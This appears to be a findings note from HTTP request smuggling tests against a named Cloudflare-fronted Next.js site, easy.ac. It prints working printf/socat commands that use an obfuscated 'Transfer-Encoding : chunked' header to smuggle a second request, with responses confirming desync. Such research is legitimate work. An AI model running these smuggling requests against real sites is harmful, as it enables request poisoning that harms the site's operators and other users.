# Cloudflare Findings

## Summary

Cloudflare-protected targets showed partial vulnerability — desync was achieved (two responses from one request) but Cloudflare has mitigations that limit practical exploitation.

Target: `easy.ac` (behind Cloudflare, Next.js backend)

---

## Test 1 — HEAD + smuggled POST

```bash
cat <(printf "HEAD /en-US HTTP/1.1\r\nHost: easy.ac\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\r\nCache-Control: max-age=0\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nPOST /en-US HTTP/1.1\r\nHost: easy.ac") - | socat - SSL:easy.ac:443
```

### Response — TWO separate HTTP responses received:

**Response 1:** `200 OK` (HEAD response as expected)
```
HTTP/1.1 200 OK
Server: cloudflare
CF-Cache-Status: DYNAMIC
```

**Response 2:** `405 Method Not Allowed` (smuggled POST was processed!)
```
HTTP/1.1 405 Method Not Allowed
Allow: GET, HEAD
Server: cloudflare
```
The 405 response includes a full Next.js error page body — the smuggled POST request was processed as a separate request by the backend.

---

## Test 2 — HEAD + smuggled GET

```bash
cat <(printf "HEAD /en-US HTTP/1.1\r\nHost: easy.ac\r\n...\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /en-US HTTP/1.1\r\nHost: easy.ac") - | socat - SSL:easy.ac:443
```
Result: Both responses returned 200 OK.

---

## Verdict

Cloudflare does NOT strip the `Transfer-Encoding : chunked` header with space, allowing it to reach the backend. Desync is confirmed (two responses from one TCP connection). However, Cloudflare's connection handling and request routing may limit the ability to poison other users' requests in practice.
